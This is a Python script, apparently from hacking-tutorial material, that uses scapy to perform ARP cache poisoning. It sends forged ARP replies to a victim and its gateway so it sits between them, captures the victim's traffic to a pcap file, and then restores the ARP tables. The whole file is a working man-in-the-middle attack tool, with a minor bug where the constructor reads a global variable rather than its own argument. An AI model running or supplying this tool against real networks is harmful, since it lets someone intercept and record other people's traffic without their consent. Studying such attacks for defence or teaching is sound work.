import sys
import time
from multiprocessing import Process

from scapy.all import ARP, Ether, conf, send, sniff, srp, wrpcap


def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=target_ip)
    response, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, response_packet in response:
        return response_packet[Ether].src
    return None


class Arper:
    def __init__(self, victim_ip, gateway_ip, interface='en0'):
        self.victim_ip = victim_ip
        self.victim_mac = get_mac(victim)
        self.gateway_ip = gateway_ip
        self.gateway_mac = get_mac(gateway_ip)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}: ')
        print(f'Gateway ({gateway_ip}) is at {self.gateway_mac}.')
        print(f'Victim ({victim_ip}) is as {self.victim_mac}.')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway_ip
        poison_victim.pdst = self.victim_ip
        poison_victim.hwdst = self.victim_mac
        print(f'IP source: {poison_victim.psrc}')
        print(f'MAC source: {poison_victim.hwsrc}')
        print(f'IP destination: {poison_victim.pdst}')
        print(f'MAC destination: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim_ip
        poison_gateway.pdst = self.gateway_ip
        poison_gateway.hwdst = self.gateway_mac
        print(f'IP source: {poison_gateway.psrc}')
        print(f'MAC source: {poison_gateway.hwsrc}')
        print(f'IP destination: {poison_gateway.pdst}')
        print(f'MAC destination: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop]')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f'IP host {self.victim_ip}'
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished!')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac,
            pdst=self.victim_ip,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

        send(ARP(
            op=2,
            psrc=self.victim_ip,
            hwsrc=self.victim_mac,
            pdst=self.gateway_ip,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
